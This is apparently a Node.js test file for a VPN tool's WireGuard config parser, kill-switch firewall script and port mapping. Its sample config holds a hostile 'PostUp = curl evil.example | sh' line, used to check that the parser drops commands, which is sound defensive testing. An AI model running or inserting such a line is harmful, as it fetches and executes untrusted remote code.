import test from 'node:test';
import assert from 'node:assert/strict';
import { parseConf, killSwitchScript, tunnelPorts, splitEndpoint, vpnImageFor } from '../src/vpn.js';

const CONF = `# my tunnel
[Interface]
PrivateKey = AAAA
Address = 10.8.0.5/32
DNS = 1.1.1.1
PostUp = curl evil.example | sh
SaveConfig = true

[Peer]
PublicKey = BBBB
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0, ::/0
`;

test('config: commands and DNS are dropped, keepalive added', () => {
  const p = parseConf(CONF);
  assert.ok(!/PostUp|DNS|SaveConfig|evil/.test(p.conf));
  assert.match(p.conf, /PersistentKeepalive = 25/);
  assert.equal(p.full, true);
  assert.deepEqual(p.endpoints, ['vpn.example.com:51820']);
  assert.equal(p.address, '10.8.0.5/32');
});

test('config: split tunnel and an existing keepalive', () => {
  const p = parseConf('[Interface]\nPrivateKey = A\nAddress = 10.8.0.5/32\n[Peer]\nPublicKey = B\nEndpoint = 1.2.3.4:51820\nAllowedIPs = 203.0.113.10/32,10.8.0.0/24\nPersistentKeepalive = 10\n');
  assert.equal(p.full, false);
  assert.deepEqual(p.allowedIps, ['203.0.113.10/32', '10.8.0.0/24']);
  assert.equal((p.conf.match(/PersistentKeepalive/g) || []).length, 1);
});

test('config: missing parts are reported', () => {
  assert.throws(() => parseConf('[Interface]\nAddress = 10.0.0.2/32\n'), (e) => e.key === 'vpn.badConf' && e.vars.line === 'PrivateKey');
  assert.throws(() => parseConf('[Interface]\nPrivateKey = A\nAddress = 10.0.0.2/32\n'), (e) => e.vars.line === '[Peer]');
  assert.throws(() => parseConf('[Interface]\nPrivateKey = A\nAddress = x\n[Peer]\nPublicKey = B\nAllowedIPs = 0.0.0.0/0\n'), (e) => e.vars.line === 'Endpoint');
  assert.throws(() => parseConf('hello world'), (e) => e.key === 'vpn.badConf');
});

test('kill switch: full tunnel rejects everything but the tunnel, the server and the LAN', () => {
  const s = killSwitchScript(parseConf(CONF));
  assert.match(s, /-o wg0 -j ACCEPT/);
  assert.match(s, /-d 192\.168\.0\.0\/16 -j ACCEPT/);
  assert.match(s, /resolve 'vpn\.example\.com'/);
  assert.match(s, /--dport 51820 -j ACCEPT/);
  assert.match(s, /iptables -A OUTPUT -j REJECT\n/);
});

test('kill switch: split tunnel only guards its own networks', () => {
  const s = killSwitchScript(parseConf('[Interface]\nPrivateKey = A\nAddress = 10.8.0.5/32\n[Peer]\nPublicKey = B\nEndpoint = 1.2.3.4:51820\nAllowedIPs = 203.0.113.10/32\n'));
  assert.match(s, /-d '203\.0\.113\.10\/32' -j REJECT/);
  assert.doesNotMatch(s, /iptables -A OUTPUT -j REJECT\n/);
});

test('ports of tunnelled services move to the tunnel container', () => {
  const cfg = { services: { app: { ports: [{ published: '8088', target: 80, protocol: 'tcp' }, { target: 9000 }] }, db: { ports: [{ published: '5432', target: 5432 }] } } };
  assert.deepEqual(tunnelPorts([{ cfg, services: ['app'] }]), ['8088:80/tcp']);
  assert.deepEqual(splitEndpoint('[2001:db8::1]:51820'), { host: '2001:db8::1', port: 51820 });
  assert.equal(vpnImageFor('0.8.0', true), 'ghcr.io/gadziunet/stackmoor-vpn:0.8.0');
  assert.equal(vpnImageFor('edge', true), 'ghcr.io/gadziunet/stackmoor-vpn:edge');
});
